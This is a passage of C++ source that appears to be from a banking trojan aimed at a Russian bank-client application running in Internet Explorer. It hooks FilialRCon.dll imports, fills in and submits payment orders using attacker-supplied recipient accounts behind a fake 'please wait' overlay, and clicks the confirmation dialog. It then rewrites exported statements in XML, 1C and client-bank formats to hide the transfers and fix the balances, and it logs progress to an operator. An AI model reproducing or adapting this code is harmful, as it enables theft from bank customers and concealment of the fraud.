						sz = oldLen - fr.len;
						fr.len = oldLen;
						stop = true;
					}
				}
			}
			html[sz] = c;
			html += sz;
		}	
	}
}

//����������� �������� ��� ������-�����
static void ModifyFormatKB( FileReport& fr )
{
	DBGRAFA( "RAFA", "����������� ������ � ������� ������-�����" );
	for( int i = 0; i < c_paymentOrders; i++ )
	{
		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
		char sumText[32];
		IntToBalans( sumInt, sumText, 0 );
		char* html = fr.text;
		bool stop = false;
		while( !stop )
		{
			int sz;
			//������� ������
			html = FindBetweenTag( html, "OPERATION", "F312: ", sz );
			if( html == 0 ) break;
			sz += 2; //������� ������ \r\n
			char c = html[sz]; //������ � ����� 0, ����� ������ �� ��� �����
			html[sz] = 0;
			//���� �� ������ ����� � ������
			char* p = m_strstr( html, sumText );
			if( p )
			{
				//���� �� ������ ���� � ������
				p = m_strstr( p, paymentOrders[i].recvAcc );
				if( p )
				{
					//�� ���������� �� ���������, ��� ��� ��������� ������
					//������� ������ � ���������, �������
					int restLen = fr.len - (html - fr.text) - sz;
					m_memcpy( html, html + sz, restLen );
					fr.len -= sz;
					html[restLen] = 0;
					int oldLen = fr.len;
					//��������� �������� �����
					static const char* flds1[] = { "F42:", "F29:", "F70:", "F71:", 0 };
					const char** fld = flds1;
					sumInt = 13449490;
					while( *fld ) 
					{
						oldLen += ChangeSumForVar( fr.text, oldLen, *fld, -sumInt, 0, 'r' );
						fld++;
					}
					
					//����������� �������
					static const char* flds2[] = { "F46:", "F52:", "F69:", 0 };
					fld = flds2;
					while( *fld ) 
					{
						oldLen += ChangeSumForVar( fr.text, oldLen, *fld, sumInt, 0, 'r' );
						fld++;
					}

					//��������� ���������� ��������
					oldLen += ChangeSumForVar( fr.text, oldLen, "F44:", -1, 2, 'r' );

					sz = oldLen - fr.len;
					fr.len = oldLen;
					stop = true;
				}
			}
			html[sz] = c;
			html += sz;
		}	
	}
}

//����������� ��� ������� xml
static void ModifyFormatXml( FileReport& fr )
{
	DBGRAFA( "RAFA", "����������� ������ � xml �������" );
	for( int i = 0; i < c_paymentOrders; i++ )
	{
		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
		char* text = fr.text;
		bool stop = false;
		while( !stop )
		{
			int sz;
			//������� ������
			text = FindBetweenTag( text, "<Statement>", "</Statement>", sz );
			if( text == 0 ) break;
			sz += 2; //������� ������ \r\n
			char c = text[sz]; //������ � ����� 0, ����� ������ �� ��� �����
			text[sz] = 0;
			//���� �� ������ ����� � ������
			char* p = m_strstr( text, paymentOrders[i].sum );
			if( p )
			{
				//���� �� ������ ���� � ������
				p = m_strstr( p, paymentOrders[i].recvAcc );
				if( p )
				{
					//������� ������ � ���������, �������
					int restLen = fr.len - (text - fr.text) - sz;
					m_memcpy( text, text + sz, restLen );
					fr.len -= sz;
					text[restLen] = 0;
					int oldLen = fr.len;

					//��������� �������� �����
					static const char* flds1[] = { "<DebitOverturn", "<DebitOverturnCover>", "<DebitOverturnDealing>", "<DebitOverturnDealingCover>", 0 };
					const char** fld = flds1;
					while( *fld ) 
					{
						oldLen += ChangeSumForVar( fr.text, oldLen, *fld, -sumInt, 0, '<' );
						fld++;
					}
					
					//����������� �������
					static const char* flds2[] = { "<OpenRemainder>", "<OutRemainder>", "<OutRemainderWithDealing>", 0 };
					fld = flds2;
					while( *fld ) 
					{
						oldLen += ChangeSumForVar( fr.text, oldLen, *fld, sumInt, 0, '<' );
						fld++;
					}

					//��������� ���������� ��������
					oldLen += ChangeSumForVar( fr.text, oldLen, "<DebitOverturnCount>", -1, 2, '<' );

					sz = oldLen - fr.len;
					fr.len = oldLen;
					stop = true;
				}
			}
			text[sz] = c;
			text += sz;
		}
	}
}

static BOOL WINAPI HandlerCloseHandle(HANDLE hObject)
{
	const char* nameReport = 0; //��� ������������ ������ ��� ����
	for( int i = 0; i < maxFileReports; i++ )
		if( fileReports[i].file == hObject ) //��� �����
		{
			//���������� ���
			switch( fileReports[i].type )
			{
				case ReportInfoOperaions:	 ModifyInfoOperaions(fileReports[i]); nameReport = "report_html"; break;
				case ReportFormatClientBank: ModifyFormatKB(fileReports[i]); nameReport = "export_to_client_bank"; break;
				case ReportFormat1C:		 ModifyFormat1C(fileReports[i]); nameReport = "export_to_1C"; break;
				case ReportFormatXml:		 ModifyFormatXml(fileReports[i]); nameReport = "export_to_xml"; break;
			}
			//����� � ����
			DWORD wr;
			pHandlerWriteFile( hObject, fileReports[i].text, fileReports[i].len, &wr, 0 );
			MemFree(fileReports[i].text);
			fileReports[i].file = 0;
			fileReports[i].text = 0;
			fileReports[i].len = 0;
			SendLogToAdminThread( 7, nameReport );
			break;
		}
	return pHandlerCloseHandle(hObject);
}


static BOOL CALLBACK EnumTreeList( HWND wnd, LPARAM lParam )
{
	DWORD hash = GetWndClassHash(wnd);
	if( pIsWindowVisible(wnd) )
	{
		if( hash == 0xEB4973EE /* SysTreeView32 */ )
		{
			treeView = wnd;
		}
		if( hash == 0xF06537E2 /* SysListView32 */ )
		{
			listView = wnd;
		}
		if( hash == 0xC1AFE727 /* ToolbarWindow32 */ )
		{
			TBBUTTON bt;
			for( int i = 0; i < 20; i++ )
			{
				m_memset( &bt, 0, sizeof(bt) );
				if( pSendMessageA( wnd, TB_GETBUTTON, (WPARAM)i, (LPARAM)&bt ) == FALSE ) break;
				char text[128];
				pSendMessageA( wnd, TB_GETBUTTONTEXT, (WPARAM)bt.idCommand, (LPARAM)text );
				DWORD hash = CalcHash(text);
				if( hash == 0x8CBC9350 /* ����� �������� */ )
				{
					toolBar = wnd;
					idBtNewDoc = bt.idCommand;
					DBGRAFA( "Rafa", "Found button %d '%s'", bt.idCommand, text );
					RECT r;
					pSendMessageA( wnd, TB_GETRECT, (WPARAM)bt.idCommand, (LPARAM)&r );
					posBtNewDoc.x = r.left;
					posBtNewDoc.y = r.top;
					DBGRAFA( "Rafa", "Found button x,y (%d,%d)", posBtNewDoc.x, posBtNewDoc.y );
				}
				if( hash == 0xD3910EEF /* �������� */ /*&& bt.idCommand == 111*/ )
				{
					RECT r;
					pSendMessageA( wnd, TB_GETRECT, (WPARAM)bt.idCommand, (LPARAM)&r );
					//���� ��� ������ ��������, �� ���� ������� 2, ������� �� ����������
					if( r.right - r.left > 20 )
					{
						toolBar = wnd;
						idBtDelivery = bt.idCommand;
						DBGRAFA( "Rafa", "Found button %d '%s'", bt.idCommand, text );
						posBtDelivery.x = r.left;
						posBtDelivery.y = r.top;
						DBGRAFA( "Rafa", "Found button x,y (%d,%d)", posBtDelivery.x, posBtDelivery.y );
					}
				}
			}
		}
	}
	return TRUE;
}

static BOOL CALLBACK EnumTopWindows( HWND wnd, LPARAM lParam )
{
	DWORD pid = 0;
	pGetWindowThreadProcessId( wnd, &pid );
	if( pid == (DWORD)lParam )
	{
		if( GetWndClassHash(wnd) == 0x6E5950C9 /* IEFrame */ ) //���� �� � ������� ��������
		{
			IEWnd = wnd; //���������� ���� ��
			pEnumChildWindows( wnd, EnumTreeList, 0 ); //���� � �������� ������ ��� ��������
			if( treeView && listView ) //����� ������ �������� (������ ����� � ������� ������ ������)
			{
				return FALSE; //������������� �����
			}
		}
	}
	return TRUE;
}

//���������� ���� wnd � ����������� �� ControlFinded, ���� ���������, �� ���������� true
static bool CmpWnd( const char* caption, DWORD captionHash, const char* className, DWORD classHash, RECT& r, ControlForm* cf )
{
	bool ok = false;
	//���� ������� ������
	if( cf->classHash && classHash ) //���� ��� ����� ������, ���������� �� ����
	{
		if( classHash == cf->classHash )
			ok = true;
	}
	else 
	{
		if( cf->classText ) //���� ��� ������, ���������� �� �����
		{
			if( className )
			{
				if( m_strstr( className, cf->classText ) )
					ok = true;
			}
		}
	}
	if( ok ) //����� ���� ������
	{
		ok = false;
		//���������� �� ��������� ����
		if( cf->captionHash && captionHash ) //���� ��� ���������
		{
			if( captionHash == cf->captionHash )
				ok = true;
		}
		else
		{
			if( cf->captionText && caption ) //���� ����� ���������
			{
				if( m_strstr( caption, cf->captionText ) )
					ok = true;
			}
			else //��������� �� ������, ���������� �� �����������
			{
				int right = cf->x + cf->w - 1, bottom = cf->y + cf->h - 1;
				if( cf->x <= r.right && right >= r.left && cf->y <= r.bottom && bottom >= r.top )
					ok = true;
			}
		}
		if( ok ) //��������� ���� �������
			return true;
	}
	return false;
}

static void GetControlRect( HWND parent, HWND wnd, RECT& r )
{
	pGetWindowRect( wnd, &r );
	//��������������� � ���������� ���� ������
	POINT p;
	p.x = r.left; p.y = r.top;
	pScreenToClient( parent, &p );
	r.right = p.x + r.right - r.left;
	r.bottom = p.y + r.bottom - r.top;
	r.left = p.x;
	r.top = p.y;
}

static bool CmpWnd( HWND parent, HWND wnd, ControlForm* cf )
{
	char* caption = GetWndText(wnd);
	char* className = GetWndClassName(wnd);
	RECT r;
	GetControlRect( parent, wnd, r );
	bool res = CmpWnd( caption, CalcHash(caption), className, STR::GetHash( className, 0, true ), r, cf );
	STR::Free(caption);
	STR::Free(className);
	return res;
}

//-----------------------------------------------------------------
//��������������� ������� ��� ������ ���� �� ���� ��
static BOOL CALLBACK EnumFindForm( HWND wnd, LPARAM lParam )
{
	DWORD pid = 0;
	pGetWindowThreadProcessId( wnd, &pid );
	if( pid == PID )
	{
		ControlFinded* cf = (ControlFinded*)lParam;
		if( CmpWnd( wnd, wnd, cf->info ) )
		{
			cf->wnd = wnd;
			return FALSE;
		}
	}
	return TRUE;
}

//���� ������ ��� ����� � �������� ����� ��
static HWND FindForm( ControlForm* form )
{
	ControlFinded cf;
	cf.wnd = 0;
	cf.info = form;
	pEnumChildWindows( 0 /*IEWnd*/, EnumFindForm, (LPARAM)&cf );
	return cf.wnd;
}
//--------------------------------------------------------------------------
struct ForFindControls
{
	ControlForm* cfIn;
	ControlFinded* cfOut;
	int countOut; //������� �������
	HWND parent;
};

//��������������� ������� ��� ������ ��������� �� �����
static BOOL CALLBACK EnumFindControls( HWND wnd, LPARAM lParam )
{
	if( pIsWindowVisible(wnd) )
	{
		ForFindControls* ffc = (ForFindControls*)lParam;
		ControlForm* pcf = ffc->cfIn;
		char* caption = GetWndText(wnd);
		char* className = GetWndClassName(wnd);
		DWORD captionHash = CalcHash(caption);
		DWORD classHash = STR::GetHash( className, 0, true );
		RECT r;
		GetControlRect( ffc->parent, wnd, r );

		//DBGRAFA( "Rafa", "%s %s", caption, className );
		while( pcf->name )
		{
			if( CmpWnd( caption, captionHash, className, classHash, r, pcf ) )
			{
				//�� ������ ������ �������, ����� �� ������ �������� �� ����� ��������� ����
				int i = 0;
				for( ; i < ffc->countOut; i++ )
					if( ffc->cfOut[i].info == pcf )
						break;
				if( i >= ffc->countOut )
				{
					ffc->cfOut[ffc->countOut].info = pcf;
					ffc->cfOut[ffc->countOut].wnd = wnd;
					ffc->countOut++;
					//DBGRAFA( "Rafa", "finded %s", pcf->name );
					break;
				}
			}
			pcf++;
		}

		STR::Free(caption);
		STR::Free(className);
	}
	return TRUE;
}

//���� �������� �� ����� parent �� �������� � ������� cfIn, ��������� ������������ � cfOut � ���������� ������� ���������� ���������
//���������. ������ cfOut ������ ���� ������� �� ���� ���������� ��������� ��� � cfIn
static int FindControls( HWND parent, ControlForm* cfIn, ControlFinded* cfOut )
{
	ForFindControls ffc;
	ffc.cfIn = cfIn;
	ffc.cfOut = cfOut;
	ffc.countOut = 0;
	ffc.parent = parent;
	pEnumChildWindows( parent, EnumFindControls, (LPARAM)&ffc );
	return ffc.countOut;
}

//------------------------------------------------------------------------------------------------------------

static bool FindTreeList()
{
	treeView = listView = 0;
	DWORD pid = GetUniquePID();
	pEnumWindows( EnumTopWindows, (LPARAM)pid );
	if( treeView && listView )
		return true;
	return false;
}

static char* GetTextTreeItem( HTREEITEM item, char* buf, int szBuf )
{
	TVITEMEX infoItem;
    m_memset( &infoItem, 0, sizeof(infoItem) );
    infoItem.mask = TVIF_TEXT | TVIF_HANDLE;
    infoItem.hItem = item;
    infoItem.pszText = buf;
    infoItem.cchTextMax = szBuf;
    buf[0] = 0;
    if( pSendMessageA( treeView, TVM_GETITEM, (WPARAM)0, (LPARAM)&infoItem ) )
		return buf;
	return 0;
}

//���� "��������� ���������"->"�������", ���������� item �������
static int FindPaymentOrder( HTREEITEM item, HTREEITEM itemPrev, TreeAccount* itemAccs, int c_itemAccs )
{
	char text[256];
	do
	{
		if( pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_EXPAND, (LPARAM)item ) )
		{
			HTREEITEM child = 0;
			//����� �������������� ������, ����� ����� �� ����� ���������, ������� ���� ���� ��������
			for( int i = 0; i < 20; i++ )
			{
				child = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_CHILD, (LPARAM)item );
				if( child != 0 ) break;
				pSleep(500);
			}
			if( child )
			{
				if( GetTextTreeItem( item, text, sizeof(text) ) )
				{
					DWORD hash = CalcHash(text);
					if( hash == 0x505B8B0E /* ��������� ��������� */ ) //������ �����
					{
						//������� ���� �� � ��������� �������
						HTREEITEM item2 = child;
						do
						{
							if( GetTextTreeItem( item2, text, sizeof(text) ) )
							{
								if( m_strstr( text, "�������" ) )
								{
									//itemPrev - ��� ����� � ������� �����
									//�������� ����� � ������� �����, ����� ��������� � ����� ������
									pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)itemPrev );
									//���������� ������ ��� ����� �����
									GetTextTreeItem( itemPrev, itemAccs[c_itemAccs].acc, sizeof(itemAccs[c_itemAccs].acc) );
									int ii = 0;
									//������� ��� �� ����� ����� � ������� (������ �� ������ ����� ���� �� ���� ���)
									for(; ii < c_itemAccs; ii++ )
										if( itemAccs[ii].itemAcc == itemPrev )
											break;
									if( ii >= c_itemAccs )
									{
										itemAccs[c_itemAccs].itemAcc = itemPrev;
										itemAccs[c_itemAccs].itemTmpls = item2;
										DBGRAFA( "Rafa", "Find tree item %s", itemAccs[c_itemAccs].acc );
										++c_itemAccs;
									}
									return c_itemAccs;
								}
							}
							item2 = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_NEXT, (LPARAM)item2 );
						}
						while(item2);
					}
				}
				c_itemAccs = FindPaymentOrder( child, item, itemAccs, c_itemAccs );
			}
		}
		pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_COLLAPSE, (LPARAM)item );
		item = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_NEXT, (LPARAM)item );
	} while( item );
	return c_itemAccs;
}

//����������� ��������� ���������� ����� ������
static void TreeViewCollapse( HTREEITEM item, int count )
{
	while( count-- )
	{
		item = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_PARENT, (LPARAM)item );
		if( item == 0 ) break;
		pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_COLLAPSE, (LPARAM)item );
	}
}

static int FindNewPaymentOrder()
{
	int index = -1;
	char text[256];
	for(;;)
	{
		index = (int)pSendMessageA( listView, LVM_GETNEXTITEM, (WPARAM)index, MAKELPARAM(LVNI_ALL, 0) );
		if( index < 0 ) break;
		LVITEM item;
		m_memset( &item, 0, sizeof(item) );
		item.pszText = text;
		item.cchTextMax = sizeof(text);
		item.iSubItem = 6; //������ � 6-� ��������� ������������ �������
		text[0] = 0;
		pSendMessageA( listView, LVM_GETITEMTEXT, (WPARAM)index, (LPARAM)&item );
		DWORD hash = CalcHash(text);
		DBGRAFA( "Rafa", "ListView %d, '%s'", index, text );
		if( hash == 0x6C433B30 /* ����� ��������� ��������� */ )
		{
			break;
		}
	}
	return index;
}

//���� ������� ����� �������� �� ����� �� ��� �����
static ControlFinded* GetControl( const char* name, ControlFinded* cf, int count )
{
	for( int i = 0; i < count; i++ )
	{
		if( m_lstrcmp( name, cf[i].info->name ) == 0 )
			return &cf[i];
	}
	return 0;
}

//����� ����� � ������� �� �����
static bool SetText( const char* name, const char* s, ControlFinded* cf, int count, const char* sendChars = 0 )
{
	ControlFinded* ctrl = GetControl( name, cf, count );
	if( ctrl )
	{
		if( s )
			pSetWindowTextA( ctrl->wnd, s );
		if( sendChars )
		{
			while( *sendChars )
			{
				pSendMessageA( ctrl->wnd, WM_CHAR, (WPARAM)*sendChars, (LPARAM)0 );
				sendChars++;
			}
		}
		return true;
	}
	return false;
}

//��������� ����� � �������� �� �����
static bool GetText( const char* name, char* s, int c_s, ControlFinded* cf, int count )
{
	if( s )
	{
		s[0] = 0;
		ControlFinded* ctrl = GetControl( name, cf, count );
		if( ctrl )
		{
			if( pGetWindowTextA( ctrl->wnd, s, c_s ) )
				return true;
		}
	}
	return false;
}

static bool SetButtonCheck( const char* name, bool check, ControlFinded* cf, int count )
{
	ControlFinded* ctrl = GetControl( name, cf, count );
	if( ctrl )
	{
		pSendMessageA( ctrl->wnd, BM_SETCHECK, (WPARAM) check ? BST_CHECKED : BST_UNCHECKED, (LPARAM)0 );
		return true;
	}
	return false;
}

static bool ClickButton( const char* name, ControlFinded* cf, int count )
{
	ControlFinded* ctrl = GetControl( name, cf, count );
	if( ctrl )
	{
		HardClickToWindow( ctrl->wnd, 5, 5 );
		return true;
	}
	return false;
}

//������� ���� � �������� �����, ������� �������� ��� ����� ��� ����
static DWORD WINAPI FakeWindow( LPVOID p )
{
	HWND parent = (HWND)p;
	HINSTANCE inst = (HINSTANCE)pGetModuleHandleA(NULL);
	RECT r, r2;
	pGetClientRect( parent, &r ); //������� ������� ����� �������
	POINT pp;
	pp.x = 0;
	pp.y = 0;
	//������ ���������� ������� �� ������
	pClientToScreen( parent, &pp ); 
	int xFW = pp.x, yFW = pp.y;
	int wFW = r.right, hFW = r.bottom;
	//������������ ��������� �������� ���� �� ����� ����
	int wPB = r.right * 80 / 100;
	int hPB = 25;
	int xPB = (r.right - wPB) / 2;
	int yPB = (r.bottom - hPB) / 2;
	//������� ���������� ����
	HWND fakeWindow = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_CHILD | WS_POPUP, xFW, yFW, wFW, hFW, parent, NULL, inst, NULL );

	if( !fakeWindow )
      return 0; 
	//���� � ������� ���������� �����
	HWND warnWnd = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, xPB, yPB - 16, wPB, 16, fakeWindow, 0, inst, 0 );
	//��� ����� ����� � ������ ����, ����� ��� ���������� ��� � ���� ������
	HWND warnText = (HWND)pCreateWindowExA( 0, STATUSCLASSNAME, "���������, ���� ��������� ������� ...", WS_VISIBLE | WS_CHILD | SBT_NOBORDERS, 0, 0, 0, 0, warnWnd, 0, inst, 0 );
	//������ ��� ������ ������ �����������, ��� ���� ��� ��������
	HWND warnWnd2 = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, wPB - 16, 0, 16, 16, warnWnd, 0, inst, 0 );
	//������� ��� �������� ���
	HWND progressBar = (HWND)pCreateWindowExA( 0, PROGRESS_CLASS, 0, WS_CHILD | WS_VISIBLE, xPB, yPB, wPB, hPB, fakeWindow, 0, inst, 0 );

	pShowWindow( fakeWindow, SW_SHOW );
	pUpdateWindow(fakeWindow);
	//������������� ������ ��� ���������� � ������ ����
	pSetTimer( fakeWindow, 1, 500, 0 );
	//����������� ������ ���
	pSendMessageA( progressBar, PBM_SETRANGE, 0, MAKELPARAM( 0, 60 )); 
	pSendMessageA( progressBar, PBM_SETSTEP, (WPARAM) 1, 0 );
	MSG msg;
	int remain = 60;
	//���������� ��������� ����
	pGetWindowRect( parent, &r2 );
	r.left = r2.left;
	r.top = r2.top;
	r.right = r2.right;
	r.bottom = r2.bottom;

	//��������� � ������ ��������� � ��������� ������ �� ���� ������
	while( (stateFakeWindow & 1) && pGetMessageA( &msg, 0, 0, 0 ) )
	{
		if( msg.message == WM_TIMER && msg.hwnd == fakeWindow ) //��� ������
		{
			pSendMessageA( progressBar, PBM_STEPIT, 0, 0 ); 
			//if( --remain == 0 )
			//	break;
		}
	    pTranslateMessage( &msg );
		pDispatchMessageA( &msg );
		//��������� �� �������� �� ���� ��������� ��� ������� ���� ������� ��������
		pGetWindowRect( parent, &r2 );
		if( r.left != r2.left || r.top != r2.top || r.right != r2.right || r.bottom != r2.bottom )
		{
			//���� ��������, �� ��������� ���� ���� ��� ������
			r.left = r2.left;
			r.top = r2.top;
			r.right = r2.right;
			r.bottom = r2.bottom;
			pGetClientRect( parent, &r2 );
			pp.x = 0;
			pp.y = 0;
			pClientToScreen( parent, &pp );
			pMoveWindow( fakeWindow, pp.x, pp.y, r2.right, r2.bottom, TRUE );
		}
	}
	pDestroyWindow(fakeWindow);
	return true;
}

static void PosMouseForMouseEvent( HWND wnd, POINT& p )
{
	pClientToScreen( wnd, &p );
	p.x = p.x * 65535 / widthScreen;
	p.y = p.y * 65535 / heightScreen;
}

//���� �������� ����� ������� �������� TreeView � ListView ���� �����
static void WorkInRafa()
{
	c_findedBalans = 0;
	HWND parent = (HWND)pGetParent(treeView);
	//��������� ������� ��������� �������� ����, ��� ��������� ��������������� ���������
	MainWndProc = (WNDPROC)pSetWindowLongA( parent, GWLP_WNDPROC, (LONG_PTR)HandlerMainWndProc );
	//���������, ��� ���� �� ��� ������� ��������
	bool was = false;
	for(int i = 0; i < c_paymentOrders; i++ )
		if( paymentOrders[i].entered )
		{
			was = true;
			break;
		}
	if( was ) 
	{
		offBtDelivery = true;
		return; //�������� �� ������
	}
	stateFakeWindow = 1; //������ ���� ����������� ���� ��������
	HANDLE hThread = pCreateThread( NULL, 0, FakeWindow, (LPVOID)parent, 0, 0 );
	pCloseHandle(hThread);

	HTREEITEM root = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_ROOT, (LPARAM)0 );
	if( root )
	{
		TreeAccount* itemAccs = (TreeAccount*)MemAlloc( sizeof(TreeAccount) * 16 ); //������ ��������� ����� ������, ������������ �������� �� 16 ������
		int c_itemAccs = 0;
		//������� ����� �������, ������ ��������� �������, ��� ��� �� ����� ��� �����������
		for( int i = 0; i < 10; i++ )
		{
			c_itemAccs = FindPaymentOrder( root, 0, itemAccs, c_itemAccs ); 
			if( c_itemAccs ) //���� ������� �����, �� ���� ��� �������, ��� ��� �������� ���� ��� �����
			{
				//if( i < 7 ) i = 7;
			}
			pSleep(1000);
		}
		if( c_itemAccs > 0 )
		{
			DBGRAFA( "Rafa", "������� ����� ������ %d", c_itemAccs );
#ifdef TEST_NOTAZ
			PaymentOrder* po = 0;
#else
			PaymentOrder* po = GetPaymentOrders(); //�������� ������ � �������� ������ ��� ���������� ��������
#endif
			if( po ) 
			{
				//���� ���� � ������� ����� ��������� ��������
				TreeAccount* itemAcc = 0;
				for( int i = 0; i < c_itemAccs; i++ )
					if( m_lstrcmp( po->sendAcc, itemAccs[i].acc ) == 0 )
					{
						itemAcc = &itemAccs[i];
						break;
					}
				if( itemAcc && pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)itemAcc->itemTmpls ) )
				{
					DBGRAFA( "Rafa", "������� ������� ��� ����� %s", itemAcc->acc );
					int indList = -1;
					for( int i = 0; i < 10; i++ )
					{
						indList = FindNewPaymentOrder();
						if( indList >= 0 ) break;
						pSleep(1000);
					}
					if( indList >= 0 )
					{
						DBGRAFA( "Rafa", "������� ����� ��������� ���������" );
						POINT posItem;
						pSendMessageA( listView, LVM_GETITEMPOSITION, (WPARAM)indList, (LPARAM)&posItem );
						stateFakeWindow |= 2; //������� ��������� ���� ��������� ��������� � ������ ��� ����������
						HardClickToWindow( listView, posItem.x + 5, posItem.y + 5 );
						DBGRAFA( "Rafa", "�������� �� ������ ���������� ���������" );
						FindTreeList();
						if( toolBar )
						{
							HardClickToWindow( toolBar, posBtNewDoc.x + 5, posBtNewDoc.y + 5 );
							DBGRAFA( "Rafa", "������ ������ �������� ������ ���������" );
							//���������� ������ ����� ��������, ��� ��� � ���� ����� ������� ���������� ��������� ��� ��������
							pmouse_event( MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, 0, 0, 0, 0 );
							//���� ��������� ����� ����� �������
							HWND formPayment = 0;
							for( int i = 0; i < 10; i++ )
							{
								formPayment = FindForm( &controlsPaymentOrder[0] );
								if( formPayment ) break;
								pSleep(1000);
							}
							if( formPayment )
							{
								//PaymentWndProc = (WNDPROC)SetWindowLongPtr( formPayment, GWLP_WNDPROC, (LONG_PTR)HandlerPaymentWndProc );
								DBGRAFA( "Rafa", "����� ����� ������� �������" );
								stateFakeWindow |= 4; //������ ����������� ��� ����������� ���� �� ����� ����� ��������
								pSleep(2000); //���� ���� ���� ��������� ����������������
								stateFakeWindow |= 16; //����� ���� ������ � ������� �������������. ����� �� �� ���� ����� (����������� ���������. ��� ������������ 1, �� ��� ����� �����)
								//���� �������� � ������� ����� �������
								ControlFinded* cf = (ControlFinded*)HEAP::Alloc( sizeof(ControlFinded) * sizeof(controlsPaymentOrder) / sizeof(ControlForm) );
								int countControls = FindControls( formPayment, controlsPaymentOrder, cf );
								if( countControls ) //����� ������ ��������, ������ ���������
								{
									DBGRAFA( "Rafa", "��������� ��������" );
									//SetText( "num", "1", cf, countControls );
									//SetText( "status", "2", cf, countControls );
									
									//������� �������� ����������� �����������
									TMemory org(512);
									GetText( "namesend", org, org.Size(), cf, countControls );
									m_lstrcat( org, " -> " );
									m_lstrcat( org, po->recvName ); //��������� ��� ����������� ����������
									SendLogToAdmin( 2, org ); //���� ��� � ������� �����������
									SetText( "sum", po->sum, cf, countControls );
									SetText( "innrecv", po->inn, cf, countControls );
									SetText( "kpprecv", po->kpp, cf, countControls );
									SetText( "accountrecv", po->recvAcc, cf, countControls );
									SetText( "namerecv", po->recvName, cf, countControls );
									SetText( "bikrecv", po->bik, cf, countControls );
									SetText( "bankrecv", po->bankName, cf, countControls );
									SetText( "accbankrecv", po->bankAcc, cf, countControls );
									SetText( "punktrecv", po->bankCity, cf, countControls );
									SetText( "comment", po->comment, cf, countControls, " " ); //�������� ��� ������������� ������� ������, ��� ��� ��� ����� ����� �� ������� ��� � ��� ���� ��� ������ �����

									stateFakeWindow |= 8; //����� ����������� ���� ���
									retMenuNds = po->nds[0] == '0' ? 4 : 5; //��� ����� ������� � ���� ��� (4 - ��� ���, 5 - � ���)
									ClickButton( "nds", cf, countControls ); //������� �� ������, ������� ��������� ���� NDS
									//���� ��������� ����, �� ����� ���� ��� �� ��������, ������ ������� TrackPopupMenu ����� ������ ������ ��� ��������
									for( int i = 0; i < 10; i++ )
									{
										if( (stateFakeWindow & 8) == 0 ) break;
										pSleep(500);
									}
									
									ControlFinded* ctrl = GetControl( "sended", cf, countControls );
									if( ctrl ) 
									{
										SetButtonCheck( "sended", true, cf, countControls );
										pSendMessageA( formPayment, WM_COMMAND, 0, (LPARAM)ctrl->wnd );
									}

									//��������� ��������								
									ClickButton( "save", cf, countControls );
									pSleep(5000); //���� ���� ����������
									stateFakeWindow &= ~16; //������� ������� ������������, ����� ������������ = 1 (� ������� ������������ �� ��������� �����)
									HardClickToWindow( toolBar, posBtDelivery.x + 5, posBtDelivery.y + 5 );
									DBGRAFA( "Rafa", "������ ������ '��������' %d,%d", posBtDelivery.x, posBtDelivery.y );
									HWND wndConfirmation = 0;
									//���� ��������� ���� �������������
									for( int i = 0; i < 10; i++ )
									{
										pSleep(1000);
										wndConfirmation = FindForm(&formConfirmation);
										if( wndConfirmation ) break;
									}
									//wndConfirmation = 0;
									if( wndConfirmation )
									{
										POINT p; p.x = 325; p.y = 235;
										PosMouseForMouseEvent( wndConfirmation, p );
										pmouse_event( MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, p.x, p.y, 0, 0 );
										pmouse_event( MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN, p.x, p.y, 0, 0 );
										//pSendMessageA( wndConfirmation, WM_MOUSEMOVE, 0, MAKELPARAM(325, 235) );
										HardClickToWindow( wndConfirmation, 336, 261 ); //�������� �� ������ �������������
										pSleep(5000);
										//����������� ������ �� ��������������� ���������
										TreeViewCollapse( itemAcc->itemTmpls, 4 );
										pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)root );
										po->entered = true;
										SavePaymentOrders();
										offBtDelivery = true;
										SendLogToAdmin(3);
									}
								}
								HEAP::Free(cf);
							}
							else
								DBGRAFA( "Rafa", "����� ����� ������� �� ���������" );
						}
					}
				}
			}
			else //���� �������� �� ���������, �� ����������� ������ �� ��������������� ���������
				TreeViewCollapse( itemAccs[0].itemTmpls, 2 );
		}
		else
			DBGRAFA( "Rafa", "������� ���������" );
		MemFree(itemAccs);
	}
	stateFakeWindow = 0; //��������� ���� �������
}

//��������� ���������� ����������
static bool InitData()
{
	for( int i = 0; i < maxFileReports; i++ )
		fileReports[i].file = 0;
	return true;
}

static DWORD WINAPI InitializeRafaHook( LPVOID p )
{
	DBGRAFA( "Rafa", "Start hook FilialRCon.dll" );
	while( true )
	{
		LPVOID dll = pGetModuleHandleA("FilialRCon.dll");
		if( dll )
		{
			bool hookDll = false;
			for( int i = 0; i < 10; i++ )
			{
				bool res = PathIAT( dll, "USER32.DLL", "SendMessageA", HandlerSendMessageA, (PVOID*)&pHandlerSendMessageA );
				res &= PathIAT( dll, "USER32.DLL", "CreateWindowExA", HandlerCreateWindowExA,(PVOID*)&pHandlerCreateWindowExA );
				res &= PathIAT( dll, "USER32.DLL", "TrackPopupMenu", HandlerTrackPopupMenu,(PVOID*)&pHandlerTrackPopupMenu );
				res &= PathIAT( dll, "KERNEL32.DLL", "CreateFileA", HandlerCreateFileA,(PVOID*)&pHandlerCreateFileA );
